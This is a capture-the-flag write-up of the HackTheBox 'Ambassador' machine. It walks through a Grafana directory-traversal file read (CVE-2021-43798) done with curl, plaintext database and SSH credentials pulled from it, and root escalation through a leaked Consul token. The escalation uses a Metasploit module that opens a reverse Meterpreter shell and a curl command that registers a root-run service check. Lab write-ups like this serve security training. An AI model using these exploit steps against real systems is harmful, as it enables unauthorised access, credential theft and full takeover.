---
title: (HTB) - Ambassador
author:
  name: eng4ge
  link: https://github.com/an9k0r
date: 2023-03-05 17:33:00 +0100
categories: [HackTheBox, Linux]
tags: [Common Applications,Outdated Software,Apache,MySQL,Grafana,Python,SQL,Configuration Analysis,Arbitrary File Read,Clear Text Credentials,Directory Traversal]
math: true
mermaid: true
image:
  src: /assets/images/ab4769b7bd6a4c5972c2a4b63f2e829248ebcd028d6f269b7a7601db9be185f8.png
  width: 694
  height: 515
  alt: image alternative text
---
# Enumeration
## NMAP
```
Nmap scan report for 10.10.11.183
Host is up (0.033s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
| ssh-hostkey: 
|   3072 29dd8ed7171e8e3090873cc651007c75 (RSA)
|   256 80a4c52e9ab1ecda276439a408973bef (ECDSA)
|_  256 f590ba7ded55cb7007f2bbc891931bf6 (ED25519)
80/tcp   open  http
|_http-generator: Hugo 0.94.2
|_http-title: Ambassador Development Server
3000/tcp open  ppp
3306/tcp open  mysql
| mysql-info: 
|   Protocol: 10
|   Version: 8.0.30-0ubuntu0.20.04.2
|   Thread ID: 15
|   Capabilities flags: 65535
|   Some Capabilities: Support41Auth, SupportsLoadDataLocal, InteractiveClient, FoundRows, IgnoreSigpipes, LongPassword, IgnoreSpaceBeforeParenthesis, Speaks41ProtocolOld, SupportsCompression, DontAllowDatabaseTableColumn, LongColumnFlag, Speaks41ProtocolNew, ConnectWithDatabase, SwitchToSSLAfterHandshake, SupportsTransactions, ODBCClient, SupportsMultipleStatments, SupportsMultipleResults, SupportsAuthPlugins
|   Status: Autocommit
|   Salt: M,\x11\x0C\x110<\x01\x0D%5zru2j{z\x14U
|_  Auth Plugin Name: caching_sha2_password
```

We have 3 ports open which might be insteressting. Mysql (for which we don't have any credentials (yet)) and web server on ports `80` and `3000`

## Website on port 80
![picture 1](/assets/images/a303993b4c577ca019d1531172b9e9f9cbbc0b694b0ec22dfe862fef249e2a14.png)  

There's nothing special running port 80 and the webserver. At least not on first sight.

## Grafana on port 3000
If we check what's on port 3000, we'll find Grafana, and we also enumerate the version, since it's on the login page => `v8.2.0 (d7f71e9eae)`.

![picture 2](/assets/images/76dd9d81c33ca245bbd4f51b554b3b7ee0fc33c8f970a36ee2cb352d7321c31d.png)  

# Initial foothold - getting access as "developer"
## Grafana - Directory Traversal and Arbitrary File Read - CVE-2021-43798 

Grafana is vulnerable to 2021-43798 (Directory Traversal and Arbitrary File Read). I've used following exploit https://www.exploit-db.com/exploits/50581, we can however also just use curl. 

```
curl --path-as-is http://10.10.11.183:3000/public/plugins/barchart/../../../../../../../../../../../../../var/lib/grafana/grafana.db -o db.db
```

Request above returns grafana database, which we can read localy.

```
┌──(luka㉿yokai)-[~/htb/boxes/ambasador]
└─$ sqlite3 db.db 
SQLite version 3.39.4 2022-09-29 15:55:41
Enter ".help" for usage hints.
sqlite> .tables
alert                       login_attempt             
...     
dashboard_tag               team_member               
dashboard_version           temp_user                 
data_source                 test_data                 
kv_store                    user                      
library_element             user_auth                 
library_element_connection  user_auth_token   
```

Password can be found in `data_source` table in plain text. 
```
sqlite> select * from data_source;
2|1|1|mysql|mysql.yaml|proxy||dontStandSoCloseToMe63221!|grafana|grafana|0|||0|{}|2022-09-01 22:43:03|2022-11-24 19:20:49|0|{}|1|uKewFgM4z
```

Mysql credentials are `grafana:dontStandSoCloseToMe63221!`

## Explore the MySQL on 3306
As now we've got the credentials, let's try to connect to MySql database.

```
┌──(luka㉿yokai)-[~/htb/boxes/ambasador]
└─$ mysql -h 10.10.11.183 -u grafana -p'dontStandSoCloseToMe63221!'
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 35
Server version: 8.0.30-0ubuntu0.20.04.2 (Ubuntu)

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| grafana            |
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| whackywidget       |
+--------------------+
6 rows in set (0.050 sec)
```

Change database to `whackywidget`

```
MySQL [(none)]> use whackywidget;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MySQL [whackywidget]> show tables;
+------------------------+
| Tables_in_whackywidget |
+------------------------+
| users                  |
+------------------------+
1 row in set (0.036 sec)

MySQL [whackywidget]> select * from users;
+-----------+------------------------------------------+
| user      | pass                                     |
+-----------+------------------------------------------+
| developer | YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg== |
+-----------+------------------------------------------+
1 row in set (0.043 sec)
```

We have `developer`'s credentials now.

## Decoding the developer's password and logging in via SSH
We can base64 decode the credentials that we've found in the mysql database and login using SSH.
```
┌──(luka㉿yokai)-[~/htb/boxes/ambasador]
└─$ echo "YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg==" | base64 -d
anEnglishManInNewYork027468

┌──(luka㉿yokai)-[~/htb/boxes/ambasador]
└─$ ssh -l developer 10.10.11.183
...

Last login: Fri Sep  2 02:33:30 2022 from 10.10.0.1
developer@ambassador:~$ id
uid=1000(developer) gid=1000(developer) groups=1000(developer)
```

Credentials work for ssh: `developer:anEnglishManInNewYork027468`

# Privilege Escalation
While being logged in as `developer` and after reading the flag, we might notice `.gitconfig` file in the home directory.

```
developer@ambassador:~$ ls -la
total 48
drwxr-xr-x 7 developer developer 4096 Sep 14 11:01 .
drwxr-xr-x 3 root      root      4096 Mar 13  2022 ..
lrwxrwxrwx 1 root      root         9 Sep 14 11:01 .bash_history -> /dev/null
-rw-r--r-- 1 developer developer  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 developer developer 3798 Mar 14  2022 .bashrc
drwx------ 3 developer developer 4096 Mar 13  2022 .cache
-rw-rw-r-- 1 developer developer   93 Sep  2 02:28 .gitconfig
drwx------ 3 developer developer 4096 Mar 14  2022 .gnupg
drwxrwxr-x 3 developer developer 4096 Mar 13  2022 .local
-rw-r--r-- 1 developer developer  807 Feb 25  2020 .profile
drwx------ 3 developer developer 4096 Mar 14  2022 snap
drwx------ 2 developer developer 4096 Mar 13  2022 .ssh
-rw-r----- 1 root      developer   33 Nov 24 19:20 user.txt

developer@ambassador:~$ cat .gitconfig 
[user]
        name = Developer
        email = developer@ambassador.local
[safe]
        directory = /opt/my-app
```

If we follow the `git` directory and check the `/opt/my-app` we'll find `whackywidget` again

```
developer@ambassador:/opt/my-app$ ls -la
total 24
drwxrwxr-x 5 root root 4096 Mar 13  2022 .
drwxr-xr-x 4 root root 4096 Sep  1 22:13 ..
drwxrwxr-x 4 root root 4096 Mar 13  2022 env
drwxrwxr-x 8 root root 4096 Mar 14  2022 .git
-rw-rw-r-- 1 root root 1838 Mar 13  2022 .gitignore
drwxrwxr-x 3 root root 4096 Mar 13  2022 whackywidget
```

By the way. We also should note the `consul` app that's find in `/opt` because who knows...

In `/opt/my-app` we can either use `git` commands or browse the `.git` directory.

```
developer@ambassador:/opt/my-app$ git log
commit 33a53ef9a207976d5ceceddc41a199558843bf3c (HEAD -> main)
Author: Developer <developer@ambassador.local>
Date:   Sun Mar 13 23:47:36 2022 +0000

    tidy config script

commit c982db8eff6f10f8f3a7d802f79f2705e7a21b55
Author: Developer <developer@ambassador.local>
Date:   Sun Mar 13 23:44:45 2022 +0000

    config script

commit 8dce6570187fd1dcfb127f51f147cd1ca8dc01c6
Author: Developer <developer@ambassador.local>
Date:   Sun Mar 13 22:47:01 2022 +0000

    created project with django CLI

commit 4b8597b167b2fbf8ec35f992224e612bf28d9e51
Author: Developer <developer@ambassador.local>
Date:   Sun Mar 13 22:44:11 2022 +0000

    .gitignore
```

What should immediately draw our attention is that there has been some changes in the config. We should check what this were.

## Consul
> What is Consul?
Consul is a service networking solution that enables teams to manage secure network connectivity between services and across multi-cloud environments and runtimes. Consul offers service discovery, identity-based authorization, L7 traffic management, and service-to-service encryption.
>
> Reference: https://developer.hashicorp.com/consul

![picture 3](/assets/images/63942f6eb167b7f8ef877e01e6487e0f35c31847cd1a96aacaa4ae7966ae0260.png)  

We will need the token above, so make not of it.

As that token has enough privileges to start services (consul runs as root!) we can do so.

```
developer@ambassador:/opt/consul$ consul acl token list --token bb03b43b-1d81-d62b-24b5-39540ee469b5
AccessorID:       00000000-0000-0000-0000-000000000002
SecretID:         anonymous
Description:      Anonymous Token
Local:            false
Create Time:      2022-03-13 23:14:16.941144142 +0000 UTC
Legacy:           false

AccessorID:       2aae5590-4b99-3b3d-56d9-71b61ee9e744
SecretID:         bb03b43b-1d81-d62b-24b5-39540ee469b5
Description:      Bootstrap Token (Global Management)
Local:            false
Create Time:      2022-03-13 23:14:25.977142971 +0000 UTC
Legacy:           false
Policies:
   00000000-0000-0000-0000-000000000001 - global-management
```

```
developer@ambassador:/opt/consul$ consul members --token bb03b43b-1d81-d62b-24b5-39540ee469b5 
Node        Address         Status  Type    Build   Protocol  DC   Partition  Segment
ambassador  127.0.0.1:8301  alive   server  1.13.2  2         dc1  default    <all>
```

We can enumerate more configuration using following command
```
curl http://127.0.0.1:8500/v1/agent/self -H 'X-Consul-Token: bb03b43b-1d81-d62b-24b5-39540ee469b5' -s | python3 -m json.tool
```

## Exploitation using Meterpreter (creates service on Consul)

Let's set up local port forwarding on the attackers machine using SSH. We're interessted on port 8500
```
ssh -N -L 8500:localhost:8500 -l developer 10.10.11.183
```

Metasploit options
```
msf6 exploit(multi/misc/consul_service_exec) > options

Module options (exploit/multi/misc/consul_service_exec):

   Name       Current Setting                       Required  Description
   ----       ---------------                       --------  -----------
   ACL_TOKEN  bb03b43b-1d81-d62b-24b5-39540ee469b5  no        Consul Agent ACL token
   Proxies                                          no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     127.0.0.1                             yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT      8500                                  yes       The target port (TCP)
   SRVHOST    0.0.0.0                               yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT    8080                                  yes       The local port to listen on.
   SSL        false                                 no        Negotiate SSL/TLS for outgoing connections
   SSLCert                                          no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /                                     yes       The base path
   URIPATH                                          no        The URI to use for this exploit (default is random)
   VHOST                                            no        HTTP server virtual host


Payload options (linux/x86/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.10.14.8       yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Linux
```

And we have root access and can simply access root shell if we want to!
```
msf6 exploit(multi/misc/consul_service_exec) > run

[*] Started reverse TCP handler on 10.10.14.8:4444 
[*] Creating service 'GWpSvUawj'
[*] Service 'GWpSvUawj' successfully created.
[*] Waiting for service 'GWpSvUawj' script to trigger
[*] Sending stage (1017704 bytes) to 10.10.11.183
[*] Meterpreter session 2 opened (10.10.14.8:4444 -> 10.10.11.183:52326) at 2022-11-25 14:35:02 +0100
[*] Removing service 'GWpSvUawj'
[*] Command Stager progress - 100.00% done (763/763 bytes)

meterpreter > getuid 
Server username: root
meterpreter > sysinfo
Computer     : 10.10.11.183
OS           : Ubuntu 20.04 (Linux 5.4.0-126-generic)
Architecture : x64
BuildTuple   : i486-linux-musl
Meterpreter  : x86/linux
```

## The Manual Way

We will register a new service using following command:
```
developer@ambassador:/tmp$ curl -X PUT -d '{"ID": "id", "Name": "name", "Address": "127.0.0.1", "Port": 80, "check": {"Args": ["/usr/bin/bash", "/tmp/run.sh"], "interval": "10s", "timeout": "1s"}}' -H 'X-Consul-Token: bb03b43b-1d81-d62b-24b5-39540ee469b5' http://127.0.0.1:8500/v1/agent/service/register 
```

We'll start `/tmp/run.sh` using the command above above, which simply copies root.txt and makes it readable for `developer`. 

```sh
developer@ambassador:/tmp$ cat run.sh 
cp /root/root.txt /tmp/root.txt
chown developer:developer /tmp/root.txt
```

You can go for shell or anything you want if you like ;).

```
developer@ambassador:/tmp$ ls -la root.txt 
-rw-r----- 1 developer developer 33 Nov 25 17:33 root.txt
```

This is however pretty much the same thing what meterpreter did for us above

![picture 4](/assets/images/aa07c5b854d140788dbe8235c777c24fbe98cf7361c23c56eb4db3d14792835e.png)  

